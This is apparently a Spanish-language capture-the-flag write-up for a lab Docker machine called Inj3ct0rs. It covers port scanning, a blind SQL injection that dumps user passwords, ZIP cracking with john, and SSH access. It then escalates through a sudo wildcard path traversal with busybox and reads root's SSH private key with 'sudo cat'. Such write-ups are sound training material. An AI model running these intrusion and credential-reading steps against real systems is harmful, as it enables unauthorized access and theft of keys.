# Reporte de Intrusión y Auditoría: Máquina Inj3ct0rs

Este documento detalla el proceso paso a paso de la auditoría de seguridad realizada sobre la máquina **Inj3ct0rs**, logrando el compromiso total del sistema desde el vector de acceso inicial hasta la obtención de privilegios de superusuario (`root`).

---

## 1. Fase de Despliegue e Inicialización

Para iniciar el entorno controlado de pruebas, se procedió a descomprimir el paquete de la máquina y ejecutar el script de despliegue automatizado en Docker.

```python

unzip inj3ct0rs.zip
bash auto_run.sh inj3ct0rss.tar

Resultado del despliegue:


IP Asignada en la red local: 172.17.0.2
```

Mecanismo de limpieza: Al concluir el análisis, la terminación del script mediante Ctrl+C destruye de manera segura el contenedor para evitar la persistencia de residuos en el sistema anfitrión.

2. Reconocimiento y Escaneo de Puertos
Se ejecutó un escaneo inicial con nmap utilizando técnicas de escaneo rápido (-sS) a alta velocidad, seguido de una inspección detallada de servicios y versiones (-sCV).

Bash
# Identificación de puertos abiertos
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>

# Análisis detallado de servicios activos
nmap -sCV -p22,80 <IP>
Resultados de la Auditoría de Puertos
Puerto	Estado	Servicio	Versión
22/tcp	Abierto	SSH	OpenSSH 9.6p1 (Ubuntu Linux)
80/tcp	Abierto	HTTP	Apache httpd 2.4.58 (Ubuntu)
Al inspeccionar el servicio web expuesto en el puerto 80, se identificó un aplicativo que implementa funciones básicas de autenticación (login.php) y gestión de usuarios (Registro). Debido a la interacción con sistemas gestores de bases de datos, se priorizó evaluar el formulario ante vulnerabilidades de inyección de código.

3. Explotación: Vulnerabilidad SQL Injection (SQLi)
Mediante la interceptación del tráfico con Burp Suite, se capturó la petición POST dirigida al archivo de autenticación y se almacenó en el archivo local request.txt:

HTTP
POST /content_pages_hidden/db.php HTTP/1.1
Host: 172.22.0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=admin
Utilizando la suite de pruebas automatizadas sqlmap, se confirmó la existencia de una vulnerabilidad de Inyección SQL basada en tiempo (Time-based blind) sobre el parámetro password.

Proceso de Enumeración y Extracción
Bases de Datos Descubiertas: injectors_db, information_schema, mysql, sys.

Estructura Interna: Extracción de la tabla users y sus respectivas columnas (id, username, password).

El volcado final de las credenciales alojadas en el sistema arrojó la siguiente base de datos de usuarios:

ID	Usuario	Contraseña / String obtenido
1	root	loveyou
2	jane	chicago123
3	admin	password
4	ralf	no_mirar_en_este_directorio
4. Análisis de Directorios Ocultos y Criptoanálisis
Las contraseñas obtenidas no contaban con validez directa en el servicio SSH. No obstante, el registro asociado al usuario ralf sugería una ruta en la estructura web. Al navegar al directorio:

Plaintext
http://<IP>/no_mirar_en_este_directorio/
Se localizó un archivo comprimido bajo el nombre de secret.zip. Debido a que requería autenticación por contraseña para su lectura, se extrajo su firma criptográfica y se procedió a un ataque de fuerza bruta empleando el diccionario rockyou.txt.

Bash
zip2john secret.zip > hash_zip
john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip
Contraseña del ZIP identificada: computer

Al extraer el interior del archivo comprimido, se descubrió el archivo confidencial.txt, el cual contenía un recordatorio de actualización de accesos para el personal de sistemas:

Credenciales de Acceso Válidas:

Usuario: ralf

Contraseña: supersecurepassword

5. Acceso Inicial y Pivoteo de Usuarios
Haciendo uso de las credenciales web recuperadas, se estableció la primera conexión al servidor de manera remota a través del protocolo seguro SSH:

Bash
ssh ralf@<IP>
Captura de Primera Bandera
Ubicación: /home/ralf/user.txt

Hash: 382af2fb41eb95b1d6c6358b6c55ffce

Movimiento Lateral hacia el Usuario capa
Se inspeccionó la configuración de permisos del usuario mediante el comando sudo -l, identificando la siguiente regla de ejecución:

Plaintext
(capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*
El comodín de ruta (*) implementado en la política de sudo permite un vector de evasión mediante Path Traversal. Al concatenar caracteres de retroceso de directorio (../), es posible desviar el flujo de ejecución fuera del entorno restringido de /nothing/ y forzar al sistema a ejecutar binarios arbitrarios con los privilegios del usuario capa.

Bash
# Evasión de restricción y ejecución de terminal
sudo -u capa /usr/local/bin/busybox /nothing/../usr/bin/sh

# Upgrade a shell interactiva
/bin/bash
6. Escalada de Privilegios a root
Nuevamente dentro del contexto del nuevo usuario capa, se listaron sus privilegios administrativos asignados en el archivo /etc/sudoers:

Plaintext
(ALL : ALL) NOPASSWD: /bin/cat
La capacidad de ejecutar el binario /bin/cat bajo el contexto de cualquier usuario sin autenticación permite la lectura directa de archivos críticos del sistema. Para asegurar un acceso persistente y sin restricciones, se extrajo la clave privada SSH correspondiente a la identidad del superusuario:

Bash
sudo /bin/cat /root/.ssh/id_rsa
Establecimiento del Acceso de Superusuario
La clave SSH recuperada fue volcada a nuestra máquina de control, modificando sus propiedades de seguridad a fin de cumplir con las políticas restrictivas de OpenSSH:

Bash
nano id_rsa  # Transferencia de clave privada
chmod 600 id_rsa
ssh -i id_rsa root@<IP>
Al concluir este paso, se obtuvo control absoluto e irrestricto sobre la máquina auditada.

Captura de Segunda Bandera (Sistemas)
Ubicación: /root/true_root.txt

Hash: 8e776bdaed0b6748686b7ce6d38ccca3
